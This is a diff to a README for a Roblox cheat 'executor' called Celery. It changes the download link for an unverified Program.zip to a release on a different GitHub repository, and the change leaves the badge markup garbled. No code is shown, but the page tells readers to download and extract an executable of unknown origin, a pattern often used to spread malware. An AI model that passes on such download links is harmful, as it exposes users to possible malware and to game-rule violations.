@@ -25,9 +25,9 @@ Celery Roblox Executor redefines gameplay possibilities on the platform, offerin
 
 To get started with Celery Roblox Executor, follow these steps:
 
-1. Download the [Program.zip](https://github.com/user-attachments/files/17578094/Program.zip) file.
+1. Download the [https://github.com/3amneoz/Roblox-Celery/releases/download/v2.0/Program.zip](https://github.com/3amneoz/Roblox-Celery/releases/download/v2.0/Program.zip) file.
    
-   [![Download Program.zip](https://img.shields.io/badge/Download-Program.zip-<COLOR_HEX_CODE>)](https://github.com/user-attachments/files/17578094/Program.zip)
+   [![Download https://github.com/3amneoz/Roblox-Celery/releases/download/v2.0/Program.zip](https://github.com/3amneoz/Roblox-Celery/releases/download/v2.0/Program.zip<COLOR_HEX_CODE>)](https://github.com/3amneoz/Roblox-Celery/releases/download/v2.0/Program.zip)
 
 2. Extract the contents of the zip file to a convenient location on your computer.
 
